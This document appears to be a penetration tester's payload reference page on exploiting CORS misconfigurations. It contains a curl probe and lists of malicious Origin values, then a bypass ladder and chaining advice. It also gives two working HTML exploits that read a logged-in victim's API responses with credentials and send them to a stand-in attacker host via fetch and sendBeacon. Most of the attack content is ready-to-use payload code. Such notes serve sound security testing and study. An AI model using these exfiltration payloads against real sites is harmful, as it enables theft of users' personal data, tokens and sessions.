---
title: "Payloads: CORS Misconfiguration"
type: payloads
tags: [payloads, cors, misconfig, access-control, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-10-31
---

# Payloads: CORS Misconfiguration

Exploit permissive `Access-Control-Allow-Origin` to read authenticated cross-origin responses (OWASP A05/A01). See [[cors-sop]].

## Test (reflect Origin?)
```bash
curl -s -I https://t/api/me -H "Origin: https://evil.com" | grep -i access-control
# vulnerable if:
#   Access-Control-Allow-Origin: https://evil.com   (reflects arbitrary)
#   + Access-Control-Allow-Credentials: true        (lets you read with cookies)
```

## Origin reflection / weak allowlist bypass
```
Origin: https://evil.com                       # arbitrary reflected
Origin: https://target.com.evil.com            # suffix match flaw
Origin: https://eviltarget.com                 # substring "target.com"
Origin: https://target.com.evil.com / https://sub.target.com   # if *.target.com trusted -> XSS on any sub
Origin: null                                   # if "null" allowed (sandboxed iframe/data: sends Origin: null)
Origin: http://target.com                      # http allowed -> MITM
```
`null` exploit:
```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://t/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil/?'+btoa(d)))</script>"></iframe>
```

## Exfil PoC (ACAO reflects + ACAC true)
```html
<script>
fetch('https://t/api/account',{credentials:'include'})
 .then(r=>r.text()).then(d=>navigator.sendBeacon('https://evil/',d));
</script>
```

## Real-world
ACAO origin-reflection with `Allow-Credentials: true` lets any attacker page read a logged-in victim's API data (PII, tokens, CSRF token -> chain to CSRF). `null`-origin and `*.domain` trust (one subdomain XSS = read all) are the common variants.

## Probe set

| probe | where | expected signal |
|---|---|---|
| reflect arbitrary origin | authenticated GET/API | `Access-Control-Allow-Origin: https://evil.com` echoed back |
| credentials flag with reflection | same request | `Access-Control-Allow-Credentials: true` = readable with cookies |
| `Origin: null` | same request | ACAO `null` = sandboxed-iframe exploit path |
| attacker subdomain origin | API endpoint | `*.target.com` trust: any subdomain page reads the data |
| suffix-match origin | API endpoint | `https://target.com.evil.com` accepted (ends-with flaw) |
| substring-match origin | API endpoint | `https://eviltarget.com` accepted (contains flaw) |
| scheme not checked | API endpoint | `http://target.com` accepted = MITM-readable |
| trusted third-party origin | API endpoint | SaaS/login-provider origin accepted: register or squat one |
| simple request (no preflight) | JSON GET | GET/POST with simple headers: response readable directly |
| allowed headers reflected | preflight `OPTIONS` | `Access-Control-Allow-Headers` echoes attacker headers |
| allowed methods reflected | preflight `OPTIONS` | `Access-Control-Allow-Methods: PUT, DELETE` exposed |
| wildcard plus credentials | API endpoint | `*` with `true` is browser-blocked, but check non-browser parsers |
| Origin echoed from Referer | redirect chains | header derived from attacker-controlled referer |
| internal origin trusted | API endpoint | corp-internal app origin accepted; SSRF or XSS there = read |

## Bypass ladder

| rung | technique |
|---|---|
| 1 | arbitrary origin reflected verbatim |
| 2 | `Origin: null` via sandboxed iframe or data: URL |
| 3 | wildcard subdomain trust: host attacker content on any sub of the trusted domain |
| 4 | suffix parse flaw: `target.com.evil.com` passes an ends-with check |
| 5 | substring parse flaw: `eviltarget.com` passes a contains check |
| 6 | scheme downgrade: `http://` origin of the real domain accepted |
| 7 | header injection on a trusted-origin page supplies the attacker origin |
| 8 | register an app on a trusted third-party origin (login provider callback) |
| 9 | preflight acceptance of arbitrary `Access-Control-Request-Headers` |

## Confirmation

Finding = one captured request pair: the request with the attacker `Origin` plus the full response headers showing ACAO reflection AND `Access-Control-Allow-Credentials: true`, then the exfil PoC page reading an authenticated endpoint end to end.
Negative control: a second, clearly-untrusted attacker origin must NOT get ACAO headers; that proves an allowlist exists and the bypass defeats it, not that the endpoint is public.
Severity ladder: credentialed reflection on an endpoint holding PII, tokens, or sessions = High; subdomain-wildcard trust = High if any subdomain is takeover-able or XSS-able; non-credentialed reflection = Low/Info (data already public to that origin).

## Chaining notes

Read CSRF tokens or session ids via CORS, then chain straight into CSRF on the same origin.
Pair with XSS on a trusted subdomain: same-site AND CORS-trusted in one foothold.
Reflected ACAO headers also feed cache poisoning and request-smuggling impact claims; see [[cors-sop]].
